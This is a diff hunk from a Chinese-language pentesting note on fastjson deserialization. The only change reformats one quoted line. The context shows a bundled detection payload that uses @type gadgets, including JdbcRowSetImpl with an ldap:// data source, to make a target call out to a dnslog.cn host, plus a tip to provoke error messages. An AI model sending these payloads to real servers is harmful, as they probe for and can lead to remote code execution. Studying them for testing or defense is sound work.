@@ -147,7 +147,7 @@ fastjson中有一个全局缓存，如果fastjosn cache为true，就会缓存jav
 个人建议，把一些有用的payload放在一个包里面发，先检测是否有dns请求，然后再单独发，确定是那个payload有效，例如：
 
 > {“a”:{“@type”:“java.net.Inet4Address”,“val”:“scspxx.dnslog.cn”},“b”:{“@type”:“java.net.Inet6Address”,“val”:“scspxx.dnslog.cn”},“c”:{“@type”:“java.net.InetSocketAddress”{“address”:,“val”:“scspxx.dnslog.cn”}},“d”:{{“@type”:“java.net.URL”,“val”:“http\://scspxx.dnslog.cn”}:“x”},“e”:{“@type”:“com.sun.rowset.JdbcRowSetImpl”,“dataSourceName”:“ldap\://scspxx.dnslog.cn”,“autoCommit”:true},“f”:{“name”:{“@type”:“java.lang.Class”,“val”:“com.sun.rowset.JdbcRowSetImpl”},“x”{“@type”:“com.sun.rowset.JdbcRowSetImpl”,“dataSourceName”:“ldap\://scspxx.dnslog.cn”,“autoCommit”:true}}},“g”:{“@type”:“javax.swing.JEditorPane”,“page”:“http\://scspxx.dnslog.cn”},“h”:{“@type”:“com.alibaba.fastjson.JSONObject”,\
-> {“@type”: “java.net.URL”,“val”:“http\://scspxx.dnslog.cn”}}“”}}
+ {“@type”: “java.net.URL”,“val”:“http\://scspxx.dnslog.cn”}}“”}}
 
 测试fastjson是否存在，以下几种方式：
 1. 破坏原先的json 结构，然后看服务器返回的报错信息
